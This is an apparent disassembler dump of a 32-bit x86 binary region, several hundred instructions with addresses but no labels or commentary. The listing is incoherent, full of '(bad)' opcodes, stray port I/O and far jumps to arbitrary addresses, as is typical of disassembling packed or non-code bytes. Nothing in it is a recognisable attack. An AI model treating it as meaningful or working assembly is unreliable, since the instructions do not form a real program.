  419b4e:	or     eax,0xa4c31c70
  419b53:	bound  edi,QWORD PTR [ebp+0x47]
  419b56:	add    DWORD PTR [edx],0xa39e0259
  419b5c:	dec    esi
  419b5d:	shl    BYTE PTR [ebx+0x20243916],1
  419b63:	shl    DWORD PTR [edx-0x742d73b2],0xca
  419b6a:	nop
  419b6b:	sar    DWORD PTR [eax+0x4c1cb6e7],1
  419b71:	ins    BYTE PTR es:[edi],dx
  419b72:	(bad)
  419b76:	mov    esp,0x6d5ac461
  419b7b:	and    eax,DWORD PTR [ebp+0x53]
  419b7e:	and    BYTE PTR [edx],dl
  419b80:	jge    0x419b6b
  419b82:	sub    dh,bh
  419b84:	pop    eax
  419b85:	nop
  419b86:	push   ecx
  419b87:	mov    ebp,0xeb274936
  419b8c:	(bad)  
  419b8d:	in     al,dx
  419b8e:	mov    esi,0xb57d222c
  419b93:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b95:	scas   al,BYTE PTR es:[edi]
  419b96:	mov    fs,esp
  419b98:	adc    DWORD PTR [ebx],esi
  419b9a:	mov    esp,0xec8d254f
  419b9f:	xor    ebx,DWORD PTR [ecx]
  419ba1:	mov    bh,0xec
  419ba3:	icebp  
  419ba4:	outs   dx,BYTE PTR ds:[esi]
  419ba5:	in     eax,dx
  419ba6:	jne    0x419bae
  419ba8:	inc    edx
  419ba9:	aam    0xdf
  419bab:	adc    eax,0x13e4cfbc
  419bb0:	jmp    0x2cfbebab
  419bb5:	inc    esp
  419bb6:	daa    
  419bb7:	out    dx,eax
  419bb8:	das    
  419bb9:	cmp    al,0x5
  419bbb:	nop
  419bbc:	xor    eax,0xb92d414c
  419bc1:	inc    edx
  419bc2:	mov    esp,0xf2067065
  419bc7:	dec    edi
  419bc8:	sti    
  419bc9:	sub    esp,DWORD PTR [eax]
  419bcb:	xlat   BYTE PTR ds:[ebx]
  419bcc:	imul   edi,DWORD PTR ds:0x3fbfed43,0x3d
  419bd3:	call   0xcd650d18
  419bd8:	adc    ah,ch
  419bda:	mov    eax,0xa460d2b5
  419bdf:	pop    esp
  419be0:	mov    edx,0x15eff120
  419be5:	js     0x419b91
  419be7:	push   ebp
  419be8:	popf   
  419be9:	mov    ebx,esp
  419beb:	xchg   ebp,eax
  419bec:	aad    0xb2
  419bee:	imul   esp,DWORD PTR [ebx*8-0x14d03e72],0xffffff9e
  419bf6:	(bad)  
  419bf7:	in     al,0x6f
  419bf9:	mov    WORD PTR [eax],gs
  419bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bfc:	test   DWORD PTR [edi-0x1db73d51],ebp
  419c02:	int3   
  419c03:	mov    eax,0x93464b49
  419c08:	test   DWORD PTR [ebx*8-0x22255ab0],esp
  419c0f:	(bad)  [esi-0x31c69616]
  419c15:	add    cl,BYTE PTR [eax-0x4fea1d30]
  419c1b:	jmp    0x7a82:0x274e327a
  419c22:	jmp    0xfb3b:0xcce229a0
  419c29:	push   ecx
  419c2a:	dec    esp
  419c2b:	sub    DWORD PTR [edi],ebp
  419c2d:	xchg   ebp,eax
  419c2e:	jecxz  0x419c33
  419c30:	in     eax,dx
  419c31:	mov    fs,WORD PTR [esp+esi*1-0xebdbc27]
  419c38:	push   ebp
  419c39:	add    al,0x8a
  419c3b:	pop    edx
  419c3c:	or     esp,DWORD PTR [esp+ecx*2-0x46]
  419c40:	test   DWORD PTR [ebp+0x53],ebp
  419c43:	sub    dh,dh
  419c45:	jp     0x419bd0
  419c47:	fs inc ebx
  419c49:	sbb    bl,BYTE PTR [esi]
  419c4b:	push   eax
  419c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c4d:	or     al,0xfa
  419c4f:	push   0xffffff91
  419c51:	scas   eax,DWORD PTR es:[edi]
  419c52:	add    eax,0xe7a2a6e
  419c57:	or     al,0x57
  419c59:	mov    cl,0x10
  419c5b:	dec    eax
  419c5c:	das    
  419c5d:	adc    al,0x65
  419c5f:	adc    eax,0x79640a8a
  419c64:	add    esp,DWORD PTR [edx+0x76]
  419c67:	mov    al,0x4b
  419c69:	sbb    esi,0xffffffe1
  419c6c:	add    esi,0x24
  419c6f:	inc    esp
  419c70:	shl    BYTE PTR [edx-0x147b4f42],1
  419c76:	pop    esi
  419c77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c78:	fsub   DWORD PTR [ebx]
  419c7a:	shr    DWORD PTR [ecx-0x45],1
  419c7d:	or     eax,0x6b79742b
  419c82:	imul   esp,ecx,0x1c99f1ed
  419c88:	xor    ebx,DWORD PTR [esi+0x424881ea]
  419c8e:	dec    ebx
  419c8f:	cmp    DWORD PTR [edx],ebx
  419c91:	jbe    0x419ccb
  419c93:	sub    ecx,DWORD PTR [edi+ecx*2]
  419c96:	inc    edx
  419c97:	les    ebx,FWORD PTR [ebx]
  419c99:	hlt    
	...
  419d12:	add    BYTE PTR [eax],al
  419d14:	and    BYTE PTR [edi-0x200729d],bl
  419d1a:	out    dx,al
  419d1b:	mov    edi,0x4100ab8e
  419d20:	inc    edi
  419d21:	ds fcmove st,st(2)
  419d24:	stos   DWORD PTR es:[edi],eax
  419d25:	cmp    eax,0x76e0001
  419d2a:	add    BYTE PTR [eax],al
  419d2c:	push   cs
  419d2d:	fisttp QWORD PTR [ebp+0x78]
  419d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d31:	jmp    0xf490431a
  419d36:	jmp    0x419d4f
  419d38:	leave  
  419d39:	jl     0x419cc3
  419d3b:	push   esp
  419d3c:	cwde   
  419d3d:	mov    ebp,0x3ad6da0d
  419d42:	jae    0x419d3d
  419d44:	and    DWORD PTR [edi-0x3],0x17
  419d48:	in     al,0xed
  419d4a:	xor    ecx,DWORD PTR [edi-0x31]
  419d4d:	pop    ebp
  419d4e:	js     0x419d55
  419d50:	mov    al,ds:0x40a1f53c
  419d55:	test   DWORD PTR [ebp-0x3f0a077d],edx
  419d5b:	dec    ebp
  419d5c:	pop    ebp
  419d5d:	xchg   edi,eax
  419d5e:	pop    ebx
  419d5f:	jmp    0x73dca871
  419d64:	imul   ebp,DWORD PTR [ebx+0x69893837],0x8add05ae
  419d6e:	or     eax,0xfc8a2947
  419d73:	clc    
  419d74:	and    DWORD PTR [edi],ebp
  419d76:	cs pop edi
  419d78:	iret   
  419d79:	test   eax,0xc7627ba6
  419d7e:	ret    
  419d7f:	fistp  WORD PTR [ebp-0x3ba842d1]
  419d85:	xor    cl,ch
  419d87:	in     eax,dx
  419d88:	cmp    DWORD PTR [esi-0x714a2cf2],ebp
  419d8e:	xchg   BYTE PTR [ebx+0x417994bf],cl
  419d94:	loopne 0x419d6c
  419d96:	pop    ds
  419d97:	or     ebx,DWORD PTR ss:[edx]
  419d9a:	arpl   di,sp
  419d9c:	sub    al,0xf7
  419d9e:	cmp    eax,0x6345611c
  419da3:	sub    ch,cl
  419da5:	mov    esi,ds
  419da7:	out    0x13,al
  419da9:	pop    ebp
  419daa:	out    0x6d,al
  419dac:	fmul   DWORD PTR [eax+0x503c5c64]
  419db3:	jns    0x419e31
  419db5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419db6:	push   esi
  419db7:	push   edx
  419db8:	xor    bl,bh
  419dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dbb:	sar    BYTE PTR [ebp-0x3b],0x65
  419dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dc0:	stos   BYTE PTR es:[edi],al
  419dc1:	rcr    BYTE PTR [eax-0x61],1
  419dc4:	js     0x419dda
  419dc6:	pop    edx
  419dc7:	popa   
  419dc8:	sub    eax,0xee0ef732
  419dcd:	mov    al,ds:0xb7f32863
  419dd2:	push   es
  419dd3:	add    DWORD PTR [ecx+0x3c],0xf8abd1e7
  419dda:	or     eax,0xc856c005
  419ddf:	sub    DWORD PTR [eax+0x7e],ebp
  419de2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419de3:	push   es
  419de4:	mov    DWORD PTR [esi+0x1a20b036],edi
  419dea:	je     0x419e00
  419dec:	rcl    DWORD PTR [eax+ebp*4+0x70],1
  419df0:	add    eax,0x87f27b52
  419df5:	mov    ch,0x2a
  419df7:	daa    
  419df8:	rol    ecx,1
  419dfa:	xor    eax,0x5fc2e44f
  419dff:	or     ecx,edx
  419e01:	int    0xf6
  419e03:	cmp    ebx,0x47
  419e06:	popf   
  419e07:	lods   eax,DWORD PTR ds:[si]
  419e09:	(bad)  [ebx+0x78]
  419e0c:	xor    bh,al
  419e0e:	add    DWORD PTR [ebx],edi
  419e10:	nop
  419e11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e12:	ss int3 
  419e14:	mov    ebx,0x69d80990
  419e19:	shl    BYTE PTR [ebp-0x39],cl
  419e1c:	ins    BYTE PTR es:[edi],dx
  419e1d:	mov    ah,0xac
  419e1f:	pop    eax
  419e20:	add    BYTE PTR [esi-0x24845393],0x7c
  419e27:	jmp    edx
  419e29:	jmp    0xd581:0x184ec07b
  419e30:	dec    esi
  419e31:	sub    al,0x37
  419e33:	ss stos DWORD PTR es:[edi],eax
  419e35:	pop    eax
  419e36:	push   ss
  419e37:	out    dx,al
  419e38:	pop    ebx
  419e39:	test   ch,al
  419e3b:	outs   dx,BYTE PTR ds:[esi]
  419e3c:	push   esp
  419e3d:	inc    ebx
  419e3e:	mov    ecx,0xfea3a8dc
  419e43:	test   eax,0x2f319f46
  419e48:	jl     0x419de2
  419e4a:	scas   al,BYTE PTR es:[edi]
  419e4b:	add    DWORD PTR [esi-0x63a35530],0xe221ca40
  419e55:	mov    ebx,0x73f45bd0
  419e5a:	or     dh,dh
  419e5c:	cmp    ah,dh
  419e5e:	dec    eax
  419e5f:	jmp    0x419df8
  419e61:	ret    
  419e62:	and    dl,cl
  419e64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e65:	shl    dh,0x5f
  419e68:	out    dx,eax
  419e69:	xor    BYTE PTR [ebx-0x3f6ffba],ch
  419e6f:	repnz mov eax,ds:0x9f57a53e
  419e75:	xlat   BYTE PTR ds:[ebx]
  419e76:	imul   DWORD PTR [ecx+ebp*4-0x686a3c89]
  419e7d:	jmp    0x419e27
  419e7f:	inc    ecx
  419e80:	and    al,0x51
  419e82:	cld    
  419e83:	xor    bl,BYTE PTR [edi]
  419e85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e86:	pop    esp
  419e87:	pop    ecx
  419e88:	mov    ecx,ecx
  419e8a:	test   eax,0x388b4cc7
  419e8f:	and    eax,0x75674ca2
  419e94:	mov    al,ds:0x5887f5c4
  419e99:	inc    edx
  419e9a:	fcom   DWORD PTR [eax+0x19]
  419e9d:	fsub   DWORD PTR ds:0xeb88dd4e
  419ea3:	dec    eax
  419ea4:	pop    eax
  419ea5:	cmp    bl,ch
  419ea7:	js     0x419e41
  419ea9:	sub    eax,0x9e10af5
  419eae:	jp     0x419f26
  419eb0:	push   ebx
  419eb1:	mov    ebx,0x6b389778
  419eb6:	push   0xe9d2ebe6
  419ebb:	and    edx,DWORD PTR [esi+0x59]
  419ebe:	and    cl,BYTE PTR ds:0x7d2cba03
  419ec4:	pop    esi
  419ec5:	mov    eax,?
  419ec7:	xchg   esp,eax
  419ec8:	add    DWORD PTR [ebp-0x32],esi
  419ecb:	xchg   ecx,eax
  419ecc:	popf   
  419ecd:	dec    edx
  419ece:	xor    al,0x20
  419ed0:	jmp    0x9b06fa8
  419ed5:	int3   
  419ed6:	lods   al,BYTE PTR ds:[esi]
  419ed7:	aaa    
  419ed8:	rcr    BYTE PTR [ebx+0x313ef614],cl
  419ede:	inc    esi
  419edf:	sbb    DWORD PTR ss:[edi-0x12],0xe506d0cf
  419ee7:	xchg   ebx,eax
  419ee8:	xchg   ebx,eax
  419ee9:	dec    edx
  419eea:	and    DWORD PTR [ebx-0x633d9c14],0x78
  419ef1:	dec    esp
  419ef2:	add    al,0x41
  419ef4:	rcl    BYTE PTR [ebx],0xa1
  419ef7:	or     edi,DWORD PTR [eax-0x1f]
  419efa:	sbb    eax,0xd6713a74
  419eff:	mov    BYTE PTR [esi+0xe],dl
  419f02:	xchg   BYTE PTR [ecx+eiz*4],cl
  419f05:	idiv   DWORD PTR cs:[edx-0x478db9e2]
  419f0c:	fisubr DWORD PTR [ebp-0x59abca73]
  419f12:	ins    BYTE PTR es:[edi],dx
  419f13:	pushf  
  419f14:	sbb    edi,DWORD PTR [ebp-0xcfc7dfa]
  419f1a:	(bad)  
  419f1b:	lock mov ecx,0xbb13c8cb
  419f21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f22:	aad    0x9f
  419f24:	pop    ss
  419f25:	jl     0x419f03
  419f27:	outs   dx,BYTE PTR ds:[esi]
  419f28:	add    eax,0x886f0832
  419f2d:	je     0x419f33
  419f2f:	or     ebx,edx
  419f31:	stos   DWORD PTR es:[edi],eax
  419f32:	mov    ebp,0xe5f6f18f
  419f37:	lds    esi,FWORD PTR [esi]
  419f39:	pop    esi
  419f3a:	sub    edx,esi
  419f3c:	mov    eax,0x95cc45e1
  419f41:	std    
  419f42:	cdq    
  419f43:	dec    edx
  419f44:	mov    eax,0x22d2d4ae
  419f49:	enter  0x49ce,0xc8
  419f4d:	jno    0x419f8e
  419f4f:	scas   eax,DWORD PTR es:[edi]
  419f50:	jge    0x419fc5
  419f52:	mov    dl,BYTE PTR [edi-0x426f5666]
  419f58:	push   edx
  419f59:	lods   eax,DWORD PTR ds:[esi]
  419f5a:	les    esi,FWORD PTR [edi+0x2d2d1062]
  419f60:	mov    ebx,0xc045b6b7
  419f65:	mov    dl,0xa6
  419f67:	sar    BYTE PTR [ecx-0x3ed4b857],0xf2
  419f6e:	pop    esi
  419f6f:	nop
  419f70:	lea    edi,[eax+0x20]
  419f73:	or     BYTE PTR [esi-0x28c1ba89],bl
  419f79:	xchg   ebx,eax
  419f7a:	call   0x13d996c3
  419f7f:	lea    ebx,[eax+0x5b]
  419f82:	or     DWORD PTR [edi+edi*4],esi
  419f85:	jno    0x419f1a
  419f87:	rcr    BYTE PTR [ebx+0x2b],1
  419f8a:	(bad)
  419f8e:	sar    BYTE PTR [ebp-0x63],0xca
  419f92:	jmp    0xf1922d02
  419f97:	mov    bl,0xa4
  419f99:	bound  edx,QWORD PTR [ebp+edx*4+0x31]
  419f9d:	dec    ebp
  419f9e:	add    DWORD PTR [edi+edx*8+0x206a2c72],ebp
  419fa5:	mov    ch,BYTE PTR [edi-0x2b00a799]
  419fab:	loop   0x419f5f
  419fad:	and    al,0xb
  419faf:	in     al,0x4e
  419fb1:	hlt    
  419fb2:	push   es
  419fb3:	dec    ecx
  419fb4:	add    dl,BYTE PTR [ebp+0x126b08]
  419fba:	ret    
  419fbb:	jae    0x419fcb
  419fbd:	stos   BYTE PTR es:[edi],al
  419fbe:	inc    ebp
  419fbf:	(bad)  
  419fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fc1:	inc    edi
  419fc2:	addr16 pop ds
  419fc4:	into   
  419fc5:	imul   BYTE PTR [esp+ebp*1]
  419fc8:	push   ecx
  419fc9:	rcr    BYTE PTR [edx+0x1b],0xe2
  419fcd:	dec    edi
  419fce:	xchg   ecx,eax
  419fcf:	cmp    bl,BYTE PTR [edx+0x4]
  419fd2:	loop   0x41a01d
  419fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fd5:	popa   
  419fd6:	lods   al,BYTE PTR ds:[esi]
  419fd7:	push   ebp
  419fd8:	test   al,0xde
  419fda:	lock loope 0x419f87
  419fdd:	jae    0x41a028
  419fdf:	sub    DWORD PTR [esi+0x12],edx
  419fe2:	out    0x79,al
  419fe4:	xchg   ecx,eax
  419fe5:	shr    BYTE PTR [ebx-0x3b],1
  419fe8:	adc    eax,0x7cfa6954
  419fed:	std    
  419fee:	sbb    eax,0x93976b59
  419ff3:	push   es
  419ff4:	(bad)  [edi+0x62]
  419ff7:	ds push ecx
  419ff9:	inc    ebx
  419ffa:	and    BYTE PTR [edx],ah
  419ffc:	mov    dh,0x63
  419ffe:	inc    esi
  419fff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a000:	nop
  41a001:	adc    bl,BYTE PTR [ebp-0x33]
  41a004:	cmp    al,0x54
  41a006:	(bad)
  41a009:	xchg   ecx,eax
  41a00a:	jae    0x41a012
  41a00c:	mov    edi,0xd8fd4ad9
  41a011:	bnd ret 0xdc81
  41a015:	or     BYTE PTR [ecx+0x36],dh
  41a018:	jae    0x41a081
  41a01a:	addr16 pop edx
  41a01c:	inc    ecx
  41a01d:	push   cs
  41a01e:	jo     0x41a076
  41a020:	or     esp,DWORD PTR [edi-0x33067e84]
  41a026:	mov    dl,BYTE PTR [ebp+0x44dc33cd]
  41a02c:	jg     0x419fe7
  41a02e:	stc    
  41a02f:	jo     0x41a04d
  41a031:	fild   DWORD PTR [edi+0x40]
  41a034:	rcr    DWORD PTR [edx+edi*4+0x7b],cl
  41a038:	inc    ebp
  41a039:	js     0x41a078
  41a03b:	dec    edx
  41a03c:	pushf  
  41a03d:	dec    ecx
  41a03e:	scas   eax,DWORD PTR es:[edi]
  41a03f:	rol    DWORD PTR [esi],cl
  41a041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a042:	jl     0x41a0ab
  41a044:	cmp    edx,ebp
  41a046:	xor    BYTE PTR [ecx+0x1d],bl
  41a049:	lea    edi,[ebx+0x186dbf45]
  41a04f:	sub    al,0xf6
  41a051:	mov    ebx,0x777957fe
  41a056:	xor    al,0x61
  41a058:	mov    bl,0xbc
  41a05a:	inc    ecx
  41a05b:	imul   esi,DWORD PTR [ecx-0x2f],0x6b
  41a05f:	js     0x41a012
  41a061:	dec    edi
  41a062:	jmp    0x83ef:0xe4412b96
  41a069:	inc    eax
  41a06a:	sub    ah,BYTE PTR ds:0x3d309b3f
  41a070:	imul   ebx,DWORD PTR [ecx-0x1c5530ff],0x3dcce220
  41a07a:	jbe    0x41a022
  41a07c:	mov    dl,0xcb
  41a07e:	mov    DWORD PTR [edi-0x1e8d247c],ebx
  41a084:	push   es
  41a085:	into   
  41a086:	(bad)  {k2}
  41a08b:	inc    esi
  41a08c:	sbb    bh,BYTE PTR [edi+0xe1a6114]
  41a092:	aas    
  41a093:	gs sbb al,0x7b
  41a096:	loope  0x41a071
  41a098:	fidivr DWORD PTR [edi-0x799f9689]
  41a09e:	xchg   esp,eax
  41a09f:	mov    cl,0xe
  41a0a1:	mov    ds:0x808bad6,eax
  41a0a6:	stos   BYTE PTR es:[edi],al
  41a0a7:	and    DWORD PTR [edi+0x47],esp
  41a0aa:	cmp    DWORD PTR [ebp-0x4c54c5f3],edx
  41a0b0:	jp     0x41a078
  41a0b2:	out    0x25,eax
  41a0b4:	out    0xb5,eax
  41a0b6:	addr16 stc 
  41a0b8:	and    eax,0xd715cc41
  41a0bd:	int3   
  41a0be:	imul   edx,DWORD PTR [esi+0x44],0x9a6f8878
  41a0c5:	xchg   DWORD PTR [ebp-0x68],eax
  41a0c8:	cmp    ebx,DWORD PTR [edi+0x18b0c76c]
  41a0ce:	inc    eax
  41a0cf:	lock std 
  41a0d1:	xor    DWORD PTR [edx],esp
  41a0d3:	sub    eax,0xb3251395
  41a0d8:	mov    edx,0x649035f8
  41a0dd:	jb     0x41a117
  41a0df:	push   ds
  41a0e0:	sbb    bh,BYTE PTR [edx]
  41a0e2:	ins    BYTE PTR es:[edi],dx
  41a0e3:	cmp    al,0xd
  41a0e5:	and    BYTE PTR [edi],dh
  41a0e7:	popf   
  41a0e8:	mov    al,BYTE PTR [edi+0x51f5d46c]
  41a0ee:	cmp    eax,0xf3cd2bcc
  41a0f3:	mov    bl,0x85
  41a0f5:	ja     0x41a0f3
  41a0f7:	cmp    BYTE PTR [eax+0x461464ab],ah
  41a0fd:	dec    edi
  41a0fe:	xor    BYTE PTR [eax],bh
  41a100:	or     DWORD PTR [edx-0x75],0x452eae35
  41a107:	loope  0x41a0ca
  41a109:	ins    BYTE PTR es:[edi],dx
  41a10a:	xlat   BYTE PTR ds:[ebx]
  41a10b:	xlat   BYTE PTR ds:[ebx]
  41a10c:	xchg   esi,eax
  41a10d:	rcl    BYTE PTR [ebx-0x44],0x41
  41a111:	fst    st(7)
  41a113:	xchg   BYTE PTR [edx],dh
  41a115:	cmp    DWORD PTR [ecx+ebx*2+0x7],ebx
  41a119:	or     eax,0x9aeff562
  41a11e:	cmp    ah,ch
  41a120:	mov    esi,0xde41afa0
  41a125:	push   ecx
  41a126:	pop    esp
  41a127:	jb     0x41a0e1
  41a129:	pushf  
  41a12a:	dec    edx
  41a12b:	add    bl,bh
  41a12d:	sbb    esp,DWORD PTR [esi]
  41a12f:	lods   al,BYTE PTR ds:[si]
  41a131:	mov    ebp,0x250758b9
  41a136:	js     0x41a103
  41a138:	xchg   esp,eax
  41a139:	loopne 0x41a176
  41a13b:	xor    ecx,DWORD PTR [ecx-0x6a5198af]
  41a141:	cs call 0x5a49:0xc6333691
  41a149:	or     BYTE PTR [esi+eax*4],dh
  41a14c:	push   eax
  41a14d:	retf   0x573e
  41a150:	jo     0x41a183
  41a152:	icebp  
  41a153:	adc    al,0xde
  41a155:	mov    al,ds:0x22a0949f
  41a15a:	sbb    BYTE PTR [eax-0x4c],ch
  41a15d:	sar    DWORD PTR [ebp-0x34f74c29],cl
  41a163:	scas   eax,DWORD PTR es:[edi]
  41a164:	repz jb 0x41a16b
  41a167:	xchg   edi,eax
  41a168:	sub    dl,BYTE PTR [edi-0x3286b84b]
  41a16e:	call   0xd6f4ac89
  41a173:	pop    ecx
  41a174:	pushf  
  41a175:	(bad)  
  41a176:	cld    
  41a177:	xor    DWORD PTR [ecx+ebp*8],ebx
  41a17a:	pop    eax
  41a17b:	(bad)  
  41a17c:	lea    edi,[ebp-0x7447d215]
  41a182:	pop    es
  41a183:	(bad)  
  41a184:	ds xchg edx,eax
  41a186:	mov    dh,0x2
  41a188:	stc    
  41a189:	hlt    
  41a18a:	test   ah,cl
  41a18c:	jne    0x41a1ae
  41a18e:	leave  
  41a18f:	es mov ?,esp
  41a192:	aam    0x36
  41a194:	ds fsub st(0),st
  41a197:	dec    ecx
  41a198:	mov    fs,WORD PTR [edi-0x953818]
  41a19e:	jl     0x41a1a6
  41a1a0:	pop    es
  41a1a1:	lds    eax,FWORD PTR [ebx-0x24]
  41a1a4:	pop    ss
  41a1a5:	xor    DWORD PTR [edx],edx
  41a1a7:	out    dx,al
  41a1a8:	or     dh,BYTE PTR [edi+ecx*8+0x21]
  41a1ac:	jns    0x41a136
  41a1ae:	or     al,dl
  41a1b0:	xor    DWORD PTR [edx+eax*2+0x28],ebx
  41a1b4:	int3   
  41a1b5:	out    dx,eax
  41a1b6:	xchg   ebx,eax
  41a1b7:	dec    esi
  41a1b8:	(bad)  
  41a1b9:	fwait
  41a1ba:	or     DWORD PTR [edx+0x68],edx
  41a1bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1be:	call   0x9308:0xad83925
  41a1c5:	dec    edx
  41a1c6:	or     DWORD PTR [esi],eax
  41a1c8:	lahf   
  41a1c9:	jb     0x41a19a
  41a1cb:	leave  
  41a1cc:	mov    ebp,DWORD PTR [esi+edi*2-0x64a25d71]
  41a1d3:	mov    edx,0x7e41d3b6
  41a1d8:	add    al,0x4e
  41a1da:	shl    ch,1
  41a1dc:	dec    ebp
  41a1dd:	mov    dh,0x31
  41a1df:	loop   0x41a18c
  41a1e1:	dec    edi
  41a1e2:	imul   esp,DWORD PTR ds:0x63a2f1e8,0x2
  41a1e9:	mov    BYTE PTR [eax],bh
  41a1eb:	sub    BYTE PTR [esi+0x61],0x75
  41a1ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1f0:	adc    ch,BYTE PTR ds:0xcce35e88
  41a1f6:	jmp    0x8156:0x9ab9788f
  41a1fd:	loop   0x41a1fd
  41a1ff:	add    ch,BYTE PTR [esi]
  41a201:	aaa    
  41a202:	dec    esp
  41a203:	ja     0x41a196
  41a205:	inc    ecx
  41a206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a207:	into   
  41a208:	sub    al,0xed
  41a20a:	xchg   ecx,eax
  41a20b:	lods   eax,DWORD PTR ds:[esi]
  41a20c:	or     eax,0x6b9c4046
  41a211:	add    eax,eax
  41a213:	jne    0x41a23f
  41a215:	xor    al,0x4d
  41a217:	pop    eax
  41a218:	mov    eax,0x913674f7
  41a21d:	add    eax,DWORD PTR [edi]
  41a21f:	sub    eax,DWORD PTR [eax+0x3590814d]
  41a225:	fsubrp st(3),st
  41a227:	sub    esi,ebx
  41a229:	fwait
  41a22a:	sub    ch,BYTE PTR [edx]
  41a22c:	mov    bh,0x77
  41a22e:	ret    
  41a22f:	mov    ah,0xe5
  41a231:	dec    ebx
  41a232:	add    cl,dl
  41a234:	sbb    cl,bl
  41a236:	shr    esp,cl
  41a238:	xchg   esp,eax
  41a239:	or     eax,0xbb8129de
  41a23e:	mov    ebx,DWORD PTR [edi-0x74]
  41a241:	hlt    
  41a242:	ins    DWORD PTR es:[edi],dx
  41a243:	mov    DWORD PTR [edi+0x5e810ba6],edi
  41a249:	ret    
  41a24a:	sub    al,0xcc
  41a24c:	fwait
  41a24d:	into   
  41a24e:	pop    esp
  41a24f:	rol    DWORD PTR [edi],cl
  41a251:	je     0x41a26b
  41a253:	mov    bh,0x56
  41a255:	pop    edi
  41a256:	xchg   edx,eax
  41a257:	es aas 
  41a259:	sti    
  41a25a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a25b:	outs   dx,DWORD PTR ds:[esi]
  41a25c:	shr    eax,cl
  41a25e:	adc    dl,BYTE PTR [esi]
  41a260:	lock jle 0x41a253
  41a263:	xchg   edi,eax
  41a264:	es repnz mov eax,0x3a92299b
  41a26b:	cli    
  41a26c:	inc    eax
  41a26d:	neg    BYTE PTR [ebx]
  41a26f:	loope  0x41a28d
  41a271:	xchg   dh,bl
  41a273:	sub    al,0x2f
  41a275:	inc    ebx
  41a276:	adc    DWORD PTR [edx-0x153c91f4],0xffffffa4
  41a27d:	or     BYTE PTR [ecx],bh
  41a27f:	or     al,0x97
  41a281:	fst    DWORD PTR [ebp+0x303e3771]
  41a287:	jg     0x41a26a
  41a289:	xor    ch,BYTE PTR [edi+esi*2-0x1d]
  41a28d:	dec    esp
  41a28e:	cli    
  41a28f:	fidivr DWORD PTR [edx+0x3bed6231]
  41a295:	fiadd  WORD PTR [ecx-0x73d5ff89]
  41a29b:	in     al,0xbe
  41a29d:	(bad)  
  41a29e:	imul   esi,DWORD PTR [esp+esi*8+0x2e],0x51e6160e
  41a2a6:	sub    al,0x5a
  41a2a8:	add    esp,eax
  41a2aa:	and    DWORD PTR fs:[esi+0x3],edx
  41a2ae:	add    BYTE PTR [ecx-0x64c44862],cl
  41a2b4:	push   ds
  41a2b5:	dec    eax
  41a2b6:	adc    eax,0x735ec2fe
  41a2bb:	xchg   edx,eax
  41a2bc:	nop
  41a2bd:	(bad)  
  41a2be:	cmp    dl,BYTE PTR [esi+0x2a0068b8]
  41a2c4:	ins    DWORD PTR es:[edi],dx
  41a2c5:	and    eax,0x27d1ac91
  41a2ca:	ja     0x41a280
  41a2cc:	int3   
  41a2cd:	bound  ecx,QWORD PTR [ecx-0xe]
  41a2d0:	shl    DWORD PTR [eax+edi*8+0x57ca074],cl
  41a2d7:	popa   
  41a2d8:	idiv   DWORD PTR [ecx+0x40]
  41a2db:	inc    edi
  41a2dc:	js     0x41a2eb
  41a2de:	push   ebp
  41a2df:	add    BYTE PTR [esi-0x24],al
  41a2e2:	sbb    ch,ch
  41a2e4:	rcr    BYTE PTR [edi],cl
  41a2e6:	jno    0x41a2ec
  41a2e8:	jbe    0x41a318
  41a2ea:	cli    
  41a2eb:	adc    DWORD PTR [edx+eax*8-0x62],eax
  41a2ef:	cmp    al,0xc7
  41a2f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2f2:	mov    al,ds:0x2c222f41
  41a2f7:	cmp    DWORD PTR ds:0xdb6f2326,eax
  41a2fd:	outs   dx,BYTE PTR ds:[esi]
  41a2fe:	xchg   esp,eax
  41a2ff:	dec    esi
  41a300:	sub    DWORD PTR [eax-0x72],ebx
  41a303:	aam    0xc1
  41a305:	fist   WORD PTR [eax+ebp*4]
  41a308:	and    BYTE PTR es:[ebx-0x6],bh
  41a30c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a30d:	xor    dh,BYTE PTR [eax]
  41a30f:	jmp    0xce95d494
  41a314:	cmc    
  41a315:	aas    
  41a316:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a318:	jl     0x41a38a
  41a31a:	xchg   esi,eax
  41a31b:	jne    0x41a366
  41a31d:	pop    ds
  41a31e:	xor    al,0x60
  41a320:	loopne 0x41a2a2
  41a322:	sbb    eax,0x43f2236b
  41a327:	add    DWORD PTR [ecx+eiz*2],0xa4415bdf
  41a32e:	jp     0x41a3a8
  41a330:	loope  0x41a340
  41a332:	sub    bl,0xed
  41a335:	jae    0x41a3a4
  41a337:	xlat   BYTE PTR ds:[ebx]
  41a338:	push   ds
  41a339:	cdq    
  41a33a:	inc    eax
  41a33b:	mov    cl,0x9c
  41a33d:	aam    0x45
  41a33f:	inc    edx
  41a340:	stos   DWORD PTR es:[edi],eax
  41a341:	(bad)
  41a345:	inc    ebp
  41a346:	dec    edx
  41a347:	addr16 mov bl,0x64
  41a34a:	sub    bh,dl
  41a34c:	and    edx,esi
  41a34e:	pop    eax
  41a34f:	sub    eax,0xa83a8ece
